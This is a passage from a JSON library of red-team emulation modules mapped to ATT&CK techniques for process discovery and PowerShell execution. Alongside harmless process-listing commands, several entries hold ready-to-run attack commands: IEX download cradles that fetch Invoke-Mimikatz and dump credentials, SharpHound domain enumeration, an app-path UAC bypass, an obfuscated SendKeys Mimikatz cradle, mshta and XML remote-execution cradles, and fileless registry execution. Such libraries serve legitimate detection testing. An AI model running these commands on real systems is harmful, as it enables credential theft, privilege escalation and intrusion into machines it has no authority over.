      "rx_module_id": "4ff64f0b-aaf2-4866-b39d-38d9791407cc",
      "module_name": "Process Discovery - ps"
    },
    {
      "index": 324,
      "technique_id": "T1057",
      "technique_name": "Process Discovery",
      "description": "Utilize tasklist to identify processes.\n\nUpon successful execution, cmd.exe will execute tasklist.exe to list processes. Output will be via stdout. \n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "tasklist\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "c5806a4f-62b8-4900-980b-c7ec004e9908",
      "module_name": "Process Discovery - tasklist"
    },
    {
      "index": 325,
      "technique_id": "T1057",
      "technique_name": "Process Discovery",
      "description": "Utilize Get-Process PowerShell cmdlet to identify processes.\n\nUpon successful execution, powershell.exe will execute Get-Process to list processes. Output will be via stdout. \n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "Get-Process\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "3b3809b6-a54b-4f5b-8aff-cb51f2e97b34",
      "module_name": "Process Discovery - Get-Process"
    },
    {
      "index": 326,
      "technique_id": "T1057",
      "technique_name": "Process Discovery",
      "description": "Utilize get-wmiObject PowerShell cmdlet to identify processes.\n\nUpon successful execution, powershell.exe will execute get-wmiObject to list processes. Output will be via stdout. \n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "get-wmiObject -class Win32_Process\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "b51239b4-0129-474f-a2b4-70f855b9f2c2",
      "module_name": "Process Discovery - get-wmiObject"
    },
    {
      "index": 327,
      "technique_id": "T1057",
      "technique_name": "Process Discovery",
      "description": "Utilize windows management instrumentation to identify processes.\n\nUpon successful execution, WMIC will execute process to list processes. Output will be via stdout. \n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "wmic process get /format:list\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "640cbf6d-659b-498b-ba53-f6dd1a1cc02c",
      "module_name": "Process Discovery - wmic process"
    },
    {
      "index": 328,
      "technique_id": "T1057",
      "technique_name": "Process Discovery",
      "description": "Adversaries may use command line tools to discover specific processes in preparation of further attacks. \nExamples of this could be discovering the PID of lsass.exe to dump its memory or discovering whether specific security processes (e.g. AV or EDR) are running.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "tasklist | findstr #{process_to_enumerate}\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "process_to_enumerate",
          "description": "Process name string to search for.",
          "type": "string",
          "default_value": "lsass"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "11ba69ee-902e-4a0f-b3b6-418aed7d7ddb",
      "module_name": "Discover Specific Process - tasklist"
    },
    {
      "index": 329,
      "technique_id": "T1057",
      "technique_name": "Process Discovery",
      "description": "Process Hacker can be exploited to infiltrate system processes, identify weak points, or achieve unauthorized control over systems. However, its malicious use can often be flagged by security defenses, rendering it a perilous tool for illegitimate purposes.",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "Start-Process -FilePath \"$Env:ProgramFiles\\Process Hacker 2\\#{processhacker_exe}\"",
        "elevation_required": true,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "processhacker_exe",
          "description": "Process hacker installation executables.",
          "type": "string",
          "default_value": "ProcessHacker.exe"
        }
      ],
      "prerequisites": [
        {
          "description": "Process Hacker must be installed in the location",
          "check_command": "if (Test-Path \"c:\\Program Files\\Process Hacker 2\\#{processhacker_exe}\") {exit 0} else {exit 1}\n",
          "install_command": "Write-Host Downloading Process Hacker\nNew-Item -Type Directory \"C:\\Temp\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://versaweb.dl.sourceforge.net/project/processhacker/processhacker2/processhacker-2.39-setup.exe\" -OutFile \"C:\\Temp\\ExternalPayloads\\processhacker-2.39-setup.exe\"\nWrite-Host Installing Process Hacker\nStart-Process \"c:\\Temp\\ExternalPayloads\\processhacker-2.39-setup.exe\" -Wait -ArgumentList \"/s\""
        }
      ],
      "rx_module_id": "966f4c16-1925-4d9b-8ce0-01334ee0867d",
      "module_name": "Process Discovery - Process Hacker"
    },
    {
      "index": 330,
      "technique_id": "T1057",
      "technique_name": "Process Discovery",
      "description": "PC Hunter is a toolkit with access to hundreds of settings including kernels, kernel modules, processes, network, startup, and more. When abused, this tool can allow threat actors to effectively access sensitive processes, collect system information, and terminate security software.",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "Start-Process -FilePath \"C:\\Temp\\ExternalPayloads\\PCHunter_free\\#{pchunter64_exe}\"",
        "elevation_required": true,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "pchunter64_exe",
          "description": "Process hacker installation executables.",
          "type": "string",
          "default_value": "PChunter64.exe"
        }
      ],
      "prerequisites": [
        {
          "description": "PCHunter must be present in device",
          "check_command": "if (Get-ChildItem -Path C:\\ -Include *PCHunter64* -File -Recurse -ErrorAction SilentlyContinue) {exit 0} else {exit 1}\n",
          "install_command": "Write-Host Downloading PC Hunter\nNew-Item -Type Directory \"C:\\Temp\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://www.snapfiles.com/directdl/PCHunter_free.zip\" -OutFile \"C:\\Temp\\ExternalPayloads\\PCHunter_free.zip\"\nExpand-Archive -LiteralPath 'C:\\Temp\\ExternalPayloads\\PCHunter_free.zip' -DestinationPath C:\\Temp\\ExternalPayloads\nWrite-Host Unzipping Installing Process Hunter"
        }
      ],
      "rx_module_id": "b4ca838d-d013-4461-bf2c-f7132617b409",
      "module_name": "Process Discovery - PC Hunter"
    },
    {
      "index": 331,
      "technique_id": "T1057",
      "technique_name": "Process Discovery",
      "description": "An adverary may launch taskmgr.exe with the /7 switch via command prompt to view processes running on the system.\n[Reference](https://github.com/trellix-enterprise/ac3-threat-sightings/blob/main/sightings/Sightings_Conti_Ransomware.yml)\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "taskmgr.exe /7\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "4fd35378-39aa-481e-b7c4-e3bf49375c67",
      "module_name": "Launch Taskmgr from cmd to View running processes"
    },
    {
      "index": 332,
      "technique_id": "T1059",
      "technique_name": "Command and Scripting Interpreter",
      "description": "An adversary may attempt to execute suspicious or malicious script using AutoIt software instead of regular terminal like powershell or cmd. Calculator will popup when the script is executed successfully.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "Start-Process -FilePath \"#{autoit_path}\" -ArgumentList \"#{script_path}\"\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "script_path",
          "description": "AutoIt Script Path",
          "type": "path",
          "default_value": "PathToRagloxModulesFolder\\T1059\\src\\calc.au3"
        },
        {
          "name": "autoit_path",
          "description": "AutoIt Executable File Path",
          "type": "path",
          "default_value": "C:\\Program Files (x86)\\AutoIt3\\AutoIt3.exe"
        }
      ],
      "prerequisites": [
        {
          "description": "AutoIt executable file must exist on disk at the specified location (#{autoit_path})\n",
          "check_command": "if(Test-Path \"#{autoit_path}\") {\n    exit 0\n} else {\n    exit 1\n}\n",
          "install_command": "New-Item -Type Directory \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\n$AutoItURL = \"https://www.autoitscript.com/cgi-bin/getfile.pl?autoit3/autoit-v3-setup.exe\"\n$InstallerPath = \"$PathToRagloxModulesFolder\\..\\ExternalPayloads\\autoit-v3-setup.exe\"\nInvoke-WebRequest -Uri $AutoItURL -OutFile $InstallerPath\nStart-Process -FilePath $InstallerPath -ArgumentList \"/S\" -Wait\n"
        }
      ],
      "rx_module_id": "a9b93f17-31cb-435d-a462-5e838a2a6026",
      "module_name": "AutoIt Script Execution"
    },
    {
      "index": 333,
      "technique_id": "T1059.001",
      "technique_name": "Command and Scripting Interpreter: PowerShell",
      "description": "Download Mimikatz and dump credentials. Upon execution, mimikatz dump details and password hashes will be displayed.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "powershell.exe \"IEX (New-Object Net.WebClient).DownloadString('#{mimurl}'); Invoke-Mimikatz -DumpCreds\"\n",
        "elevation_required": true,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "mimurl",
          "description": "Mimikatz url",
          "type": "url",
          "default_value": "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "f3132740-55bc-48c4-bcc0-758a459cd027",
      "module_name": "Mimikatz"
    },
    {
      "index": 334,
      "technique_id": "T1059.001",
      "technique_name": "Command and Scripting Interpreter: PowerShell",
      "description": "Upon execution SharpHound will be downloaded to disk, imported and executed. It will set up collection methods, run and then compress and store the data to the temp directory on the machine. If system is unable to contact a domain, proper execution will not occur.\n\nSuccessful execution will produce stdout message stating \"SharpHound Enumeration Completed\". Upon completion, final output will be a *BloodHound.zip file.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "import-module \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\SharpHound.ps1\"\ntry { Invoke-BloodHound -OutputDirectory $env:Temp }\ncatch { $_; exit $_.Exception.HResult}\nStart-Sleep 5\n",
        "elevation_required": false,
        "cleanup_command": "Remove-Item $env:Temp\\*BloodHound.zip -Force\n"
      },
      "variables": [],
      "prerequisites": [
        {
          "description": "SharpHound.ps1 must be located at \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\SharpHound.ps1\"\n",
          "check_command": "if (Test-Path \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\SharpHound.ps1\") {exit 0} else {exit 1}\n",
          "install_command": "New-Item -Type Directory \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://raw.githubusercontent.com/BloodHoundAD/BloodHound/804503962b6dc554ad7d324cfa7f2b4a566a14e2/Ingestors/SharpHound.ps1\" -OutFile \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\SharpHound.ps1\"\n"
        }
      ],
      "rx_module_id": "a21bb23e-e677-4ee7-af90-6931b57b6350",
      "module_name": "Run BloodHound from local disk"
    },
    {
      "index": 335,
      "technique_id": "T1059.001",
      "technique_name": "Command and Scripting Interpreter: PowerShell",
      "description": "Upon execution SharpHound will load into memory and execute against a domain. It will set up collection methods, run and then compress and store the data to the temp directory. If system is unable to contact a domain, proper execution will not occur.\n\nSuccessful execution will produce stdout message stating \"SharpHound Enumeration Completed\". Upon completion, final output will be a *BloodHound.zip file.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "write-host \"Remote download of SharpHound.ps1 into memory, followed by execution of the script\" -ForegroundColor Cyan\nIEX (New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/804503962b6dc554ad7d324cfa7f2b4a566a14e2/Ingestors/SharpHound.ps1');\nInvoke-BloodHound -OutputDirectory $env:Temp\nStart-Sleep 5\n",
        "elevation_required": false,
        "cleanup_command": "Remove-Item $env:Temp\\*BloodHound.zip -Force\n"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "bf8c1441-4674-4dab-8e4e-39d93d08f9b7",
      "module_name": "Run Bloodhound from Memory using Download Cradle"
    },
    {
      "index": 336,
      "technique_id": "T1059.001",
      "technique_name": "Command and Scripting Interpreter: PowerShell",
      "description": "Run mimikatz via PsSendKeys. Upon execution, automated actions will take place to open file explorer, open notepad and input code, then mimikatz dump info will be displayed.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "$url='https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1';$wshell=New-Object -ComObject WScript.Shell;$reg='HKCU:\\Software\\Microsoft\\Notepad';$app='Notepad';$props=(Get-ItemProperty $reg);[Void][System.Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms');@(@('iWindowPosY',([String]([System.Windows.Forms.Screen]::AllScreens)).Split('}')[0].Split('=')[5]),@('StatusBar',0))|ForEach{SP $reg (Item Variable:_).Value[0] (Variable _).Value[1]};$curpid=$wshell.Exec($app).ProcessID;While(!($title=GPS|?{(Item Variable:_).Value.id-ieq$curpid}|ForEach{(Variable _).Value.MainWindowTitle})){Start-Sleep -Milliseconds 500};While(!$wshell.AppActivate($title)){Start-Sleep -Milliseconds 500};$wshell.SendKeys('^o');Start-Sleep -Milliseconds 500;@($url,(' '*1000),'~')|ForEach{$wshell.SendKeys((Variable _).Value)};$res=$Null;While($res.Length -lt 2){[Windows.Forms.Clipboard]::Clear();@('^a','^c')|ForEach{$wshell.SendKeys((Item Variable:_).Value)};Start-Sleep -Milliseconds 500;$res=([Windows.Forms.Clipboard]::GetText())};[Windows.Forms.Clipboard]::Clear();@('%f','x')|ForEach{$wshell.SendKeys((Variable _).Value)};If(GPS|?{(Item Variable:_).Value.id-ieq$curpid}){@('{TAB}','~')|ForEach{$wshell.SendKeys((Item Variable:_).Value)}};@('iWindowPosDY','iWindowPosDX','iWindowPosY','iWindowPosX','StatusBar')|ForEach{SP $reg (Item Variable:_).Value $props.((Variable _).Value)};IEX($res);invoke-mimikatz -dumpcr\n",
        "elevation_required": true,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "af1800cf-9f9d-4fd1-a709-14b1e6de020d",
      "module_name": "Mimikatz - Cradlecraft PsSendKeys"
    },
    {
      "index": 337,
      "technique_id": "T1059.001",
      "technique_name": "Command and Scripting Interpreter: PowerShell",
      "description": "Note: Windows 10 only. Upon execution windows backup and restore window will be opened.\n\nBypass is based on: https://enigma0x3.net/2017/03/14/bypassing-uac-using-app-paths/\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "Powershell.exe \"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/enigma0x3/Misc-PowerShell-Stuff/a0dfca7056ef20295b156b8207480dc2465f94c3/Invoke-AppPathBypass.ps1'); Invoke-AppPathBypass -Payload 'C:\\Windows\\System32\\cmd.exe'\"\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "06a220b6-7e29-4bd8-9d07-5b4d86742372",
      "module_name": "Invoke-AppPathBypass"
    },
    {
      "index": 338,
      "technique_id": "T1059.001",
      "technique_name": "Command and Scripting Interpreter: PowerShell",
      "description": "Powershell MsXml COM object. Not proxy aware, removing cache although does not appear to write to those locations. Upon execution, \"Download Cradle test success!\" will be displayed.\n\nProvided by https://github.com/mgreen27/mgreen27.github.io\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "powershell.exe -exec bypass -noprofile \"$comMsXml=New-Object -ComObject MsXml2.ServerXmlHttp;$comMsXml.Open('GET','#{url}',$False);$comMsXml.Send();IEX $comMsXml.ResponseText\"\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "url",
          "description": "url of payload to execute",
          "type": "url",
          "default_value": "https://raw.githubusercontent.com/redcanaryco/raglox-red-team/master/rx_modules/T1059.001/src/test.ps1"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "388a7340-dbc1-4c9d-8e59-b75ad8c6d5da",
      "module_name": "Powershell MsXml COM object - with prompt"
    },
    {
      "index": 339,
      "technique_id": "T1059.001",
      "technique_name": "Command and Scripting Interpreter: PowerShell",
      "description": "Powershell xml download request. Upon execution, \"Download Cradle test success!\" will be dispalyed.\n\nProvided by https://github.com/mgreen27/mgreen27.github.io\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -exec bypass -noprofile \"$Xml = (New-Object System.Xml.XmlDocument);$Xml.Load('#{url}');$Xml.command.a.execute | IEX\"\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "url",
          "description": "url of payload to execute",
          "type": "url",
          "default_value": "https://raw.githubusercontent.com/redcanaryco/raglox-red-team/master/rx_modules/T1059.001/src/test.xml"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "4396927f-e503-427b-b023-31049b9b09a6",
      "module_name": "Powershell XML requests"
    },
    {
      "index": 340,
      "technique_id": "T1059.001",
      "technique_name": "Command and Scripting Interpreter: PowerShell",
      "description": "Powershell invoke mshta to download payload. Upon execution, a new PowerShell window will be opened which will display \"Download Cradle test success!\".\n\nProvided by https://github.com/mgreen27/mgreen27.github.io\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "C:\\Windows\\system32\\cmd.exe /c \"mshta.exe javascript:a=GetObject('script:#{url}').Exec();close()\"\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "url",
          "description": "url of payload to execute",
          "type": "url",
          "default_value": "https://raw.githubusercontent.com/redcanaryco/raglox-red-team/master/rx_modules/T1059.001/src/mshta.sct"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "8a2ad40b-12c7-4b25-8521-2737b0a415af",
      "module_name": "Powershell invoke mshta.exe download"
    },
    {
      "index": 341,
      "technique_id": "T1059.001",
      "technique_name": "Command and Scripting Interpreter: PowerShell",
      "description": "Provided by https://github.com/mgreen27/mgreen27.github.io\nInvoke-DownloadCradle is used to generate Network and Endpoint artifacts.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "manual",
        "command": "",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "cc50fa2a-a4be-42af-a88f-e347ba0bf4d7",
      "module_name": "Powershell Invoke-DownloadCradle"
    },
    {
      "index": 342,
      "technique_id": "T1059.001",
      "technique_name": "Command and Scripting Interpreter: PowerShell",
      "description": "Execution of a PowerShell payload from the Windows Registry similar to that seen in fileless malware infections. Upon exection, open \"C:\\Windows\\Temp\" and verify that\nart-marker.txt is in the folder.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "# Encoded payload in next command is the following \"Set-Content -path \"$env:SystemRoot/Temp/art-marker.txt\" -value \"Hello from the RAGLOX Threat Library\"\"\nreg.exe add \"HKEY_CURRENT_USER\\Software\\Classes\\RAGLOXRedTeam\" /v ART /t REG_SZ /d \"U2V0LUNvbnRlbnQgLXBhdGggIiRlbnY6U3lzdGVtUm9vdC9UZW1wL2FydC1tYXJrZXIudHh0IiAtdmFsdWUgIkhlbGxvIGZyb20gdGhlIEF0b21pYyBSZWQgVGVhbSI=\" /f\niex ([Text.Encoding]::ASCII.GetString([Convert]::FromBase64String((gp 'HKCU:\\Software\\Classes\\RAGLOXRedTeam').ART)))\n",
        "elevation_required": false,
        "cleanup_command": "Remove-Item -path C:\\Windows\\Temp\\art-marker.txt -Force -ErrorAction Ignore\nRemove-Item HKCU:\\Software\\Classes\\RAGLOXRedTeam -Force -ErrorAction Ignore\n"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "fa050f5e-bc75-4230-af73-b6fd7852cd73",
      "module_name": "PowerShell Fileless Script Execution"
    },
    {
      "index": 343,
      "technique_id": "T1059.001",
      "technique_name": "Command and Scripting Interpreter: PowerShell",
      "description": "Creates a file with an alternate data stream and simulates executing that hidden code/file. Upon execution, \"Stream Data Executed\" will be displayed.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "Add-Content -Path #{ads_file} -Value 'Write-Host \"Stream Data Executed\"' -Stream 'streamCommand'\n$streamcommand = Get-Content -Path #{ads_file} -Stream 'streamcommand'\nInvoke-Expression $streamcommand\n",
        "elevation_required": false,
        "cleanup_command": "Remove-Item #{ads_file} -Force -ErrorAction Ignore\n"
      },
      "variables": [
        {
          "name": "ads_file",
          "description": "File created to store Alternate Stream Data",
          "type": "string",
          "default_value": "$env:TEMP\\NTFS_ADS.txt"
        }
      ],
      "prerequisites": [
        {
          "description": "Homedrive must be an NTFS drive\n",
          "check_command": "if((Get-Volume -DriveLetter $env:HOMEDRIVE[0]).FileSystem -contains \"NTFS\") {exit 0} else {exit 1}\n",
          "install_command": "Write-Host Prereq's for this test cannot be met automatically\n"
        }
      ],
      "rx_module_id": "8e5c5532-1181-4c1d-bb79-b3a9f5dbd680",
      "module_name": "NTFS Alternate Data Stream Access"
    },
    {
      "index": 344,
      "technique_id": "T1059.001",
      "technique_name": "Command and Scripting Interpreter: PowerShell",
      "description": "Connect to a remote powershell session and interact with the host.\nUpon execution, network test info and 'T1086 PowerShell Session Creation and Use' will be displayed.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "New-PSSession -ComputerName #{hostname_to_connect}\nTest-Connection $env:COMPUTERNAME\nSet-Content -Path $env:TEMP\\T1086_PowerShell_Session_Creation_and_Use -Value \"T1086 PowerShell Session Creation and Use\"\nGet-Content -Path $env:TEMP\\T1086_PowerShell_Session_Creation_and_Use\nRemove-Item -Force $env:TEMP\\T1086_PowerShell_Session_Creation_and_Use\n",
        "elevation_required": true,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "hostname_to_connect",
          "description": "The host to connect to, by default it will connect to the local machine",
          "type": "string",
          "default_value": "$env:COMPUTERNAME"
        }
      ],
      "prerequisites": [
        {
          "description": "PSRemoting must be enabled\n",
          "check_command": "Try {\n    New-PSSession -ComputerName #{hostname_to_connect} -ErrorAction Stop | Out-Null\n    exit 0\n} \nCatch {\n    exit 1\n}\n",
          "install_command": "Enable-PSRemoting\n"
        }
      ],
      "rx_module_id": "7c1acec2-78fa-4305-a3e0-db2a54cddecd",
      "module_name": "PowerShell Session Creation and Use"
    },
    {
      "index": 345,
      "technique_id": "T1059.001",
      "technique_name": "Command and Scripting Interpreter: PowerShell",
      "description": "Executes powershell.exe with variations of the -Command parameter",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "Out-ATHPowerShellCommandLineParameter -CommandLineSwitchType #{command_line_switch_type} -CommandParamVariation #{command_param_variation} -Execute -ErrorAction Stop",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "command_line_switch_type",
          "description": "The type of supported command-line switch to use",
          "type": "string",
          "default_value": "Hyphen"
        },
        {
          "name": "command_param_variation",
          "description": "The \"Command\" parameter variation to use",
          "type": "string",
          "default_value": "C"
        }
      ],
      "prerequisites": [
        {
          "description": "The RAGLOXTestHarnesses module must be installed and Out-ATHPowerShellCommandLineParameter must be exported in the module.",
          "check_command": "$RequiredModule = Get-Module -Name RAGLOXTestHarnesses -ListAvailable\nif (-not $RequiredModule) {exit 1}\nif (-not $RequiredModule.ExportedCommands['Out-ATHPowerShellCommandLineParameter']) {exit 1} else {exit 0}",
          "install_command": "Install-Module -Name RAGLOXTestHarnesses -Scope CurrentUser -Force\n"
        }
      ],
      "rx_module_id": "686a9785-f99b-41d4-90df-66ed515f81d7",
      "module_name": "ATHPowerShellCommandLineParameter -Command parameter variations"
    },
    {
      "index": 346,
      "technique_id": "T1059.001",
      "technique_name": "Command and Scripting Interpreter: PowerShell",
      "description": "Executes powershell.exe with variations of the -Command parameter with encoded arguments supplied",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "Out-ATHPowerShellCommandLineParameter -CommandLineSwitchType #{command_line_switch_type} -CommandParamVariation #{command_param_variation} -UseEncodedArguments -EncodedArgumentsParamVariation #{encoded_arguments_param_variation} -Execute -ErrorAction Stop",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "command_line_switch_type",
          "description": "The type of supported command-line switch to use",
          "type": "string",
          "default_value": "Hyphen"
        },
        {
          "name": "command_param_variation",
          "description": "The \"Command\" parameter variation to use",
          "type": "string",
          "default_value": "C"
        },
        {
          "name": "encoded_arguments_param_variation",
          "description": "The \"EncodedArguments\" parameter variation to use",
          "type": "string",
          "default_value": "EA"
        }
      ],
      "prerequisites": [
        {
          "description": "The RAGLOXTestHarnesses module must be installed and Out-ATHPowerShellCommandLineParameter must be exported in the module.",
          "check_command": "$RequiredModule = Get-Module -Name RAGLOXTestHarnesses -ListAvailable\nif (-not $RequiredModule) {exit 1}\nif (-not $RequiredModule.ExportedCommands['Out-ATHPowerShellCommandLineParameter']) {exit 1} else {exit 0}",
          "install_command": "Install-Module -Name RAGLOXTestHarnesses -Scope CurrentUser -Force\n"
        }
      ],
      "rx_module_id": "1c0a870f-dc74-49cf-9afc-eccc45e58790",
      "module_name": "ATHPowerShellCommandLineParameter -Command parameter variations with encoded arguments"
    },
    {
      "index": 347,
      "technique_id": "T1059.001",
      "technique_name": "Command and Scripting Interpreter: PowerShell",
      "description": "Executes powershell.exe with variations of the -EncodedCommand parameter",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "Out-ATHPowerShellCommandLineParameter -CommandLineSwitchType #{command_line_switch_type} -EncodedCommandParamVariation #{encoded_command_param_variation} -Execute -ErrorAction Stop",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "command_line_switch_type",
          "description": "The type of supported command-line switch to use",
          "type": "string",
          "default_value": "Hyphen"
        },
        {
          "name": "encoded_command_param_variation",
          "description": "The \"EncodedCommand\" parameter variation to use",
          "type": "string",
          "default_value": "E"
        }
      ],
      "prerequisites": [
        {
          "description": "The RAGLOXTestHarnesses module must be installed and Out-ATHPowerShellCommandLineParameter must be exported in the module.",
          "check_command": "$RequiredModule = Get-Module -Name RAGLOXTestHarnesses -ListAvailable\nif (-not $RequiredModule) {exit 1}\nif (-not $RequiredModule.ExportedCommands['Out-ATHPowerShellCommandLineParameter']) {exit 1} else {exit 0}",
          "install_command": "Install-Module -Name RAGLOXTestHarnesses -Scope CurrentUser -Force\n"
        }
      ],
      "rx_module_id": "86a43bad-12e3-4e85-b97c-4d5cf25b95c3",
      "module_name": "ATHPowerShellCommandLineParameter -EncodedCommand parameter variations"
    },
    {
      "index": 348,
      "technique_id": "T1059.001",
      "technique_name": "Command and Scripting Interpreter: PowerShell",
      "description": "Executes powershell.exe with variations of the -EncodedCommand parameter with encoded arguments supplied",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "Out-ATHPowerShellCommandLineParameter -CommandLineSwitchType #{command_line_switch_type} -EncodedCommandParamVariation #{encoded_command_param_variation} -UseEncodedArguments -EncodedArgumentsParamVariation #{encoded_arguments_param_variation} -Execute -ErrorAction Stop",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "encoded_command_param_variation",
          "description": "The \"EncodedCommand\" parameter variation to use",
          "type": "string",
          "default_value": "E"
        },
        {
          "name": "command_line_switch_type",
          "description": "The type of supported command-line switch to use",
          "type": "string",
          "default_value": "Hyphen"
        },
        {
          "name": "encoded_arguments_param_variation",
          "description": "The \"EncodedArguments\" parameter variation to use",
          "type": "string",
          "default_value": "EncodedArguments"
        }
      ],
      "prerequisites": [
        {
          "description": "The RAGLOXTestHarnesses module must be installed and Out-ATHPowerShellCommandLineParameter must be exported in the module.",
          "check_command": "$RequiredModule = Get-Module -Name RAGLOXTestHarnesses -ListAvailable\nif (-not $RequiredModule) {exit 1}\nif (-not $RequiredModule.ExportedCommands['Out-ATHPowerShellCommandLineParameter']) {exit 1} else {exit 0}",
          "install_command": "Install-Module -Name RAGLOXTestHarnesses -Scope CurrentUser -Force\n"
        }
      ],
      "rx_module_id": "0d181431-ddf3-4826-8055-2dbf63ae848b",
      "module_name": "ATHPowerShellCommandLineParameter -EncodedCommand parameter variations with encoded arguments"
    },
    {
      "index": 349,
      "technique_id": "T1059.001",
      "technique_name": "Command and Scripting Interpreter: PowerShell",
      "description": "Use of obfuscated PowerShell to execute an arbitrary command; outputs \"Hello, from PowerShell!\". Example is from the 2021 Threat Detection Report by Red Canary.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "powershell.exe -e  #{obfuscated_code}\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "obfuscated_code",
          "description": "Defaults to: Invoke-Expression with a \"Write-Host\" line.",
          "type": "string",
          "default_value": "JgAgACgAZwBjAG0AIAAoACcAaQBlAHsAMAB9ACcAIAAtAGYAIAAnAHgAJwApACkAIAAoACIAVwByACIAKwAiAGkAdAAiACsAIgBlAC0ASAAiACsAIgBvAHMAdAAgACcASAAiACsAIgBlAGwAIgArACIAbABvACwAIABmAHIAIgArACIAbwBtACAAUAAiACsAIgBvAHcAIgArACIAZQByAFMAIgArACIAaAAiACsAIgBlAGwAbAAhACcAIgApAA=="
        }
      ],
      "prerequisites": [],
      "rx_module_id": "a538de64-1c74-46ed-aa60-b995ed302598",
      "module_name": "PowerShell Command Execution"
    },
    {
      "index": 350,
      "technique_id": "T1059.001",
      "technique_name": "Command and Scripting Interpreter: PowerShell",
      "description": "Powershell execution of known Malicious PowerShell Cmdlets",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
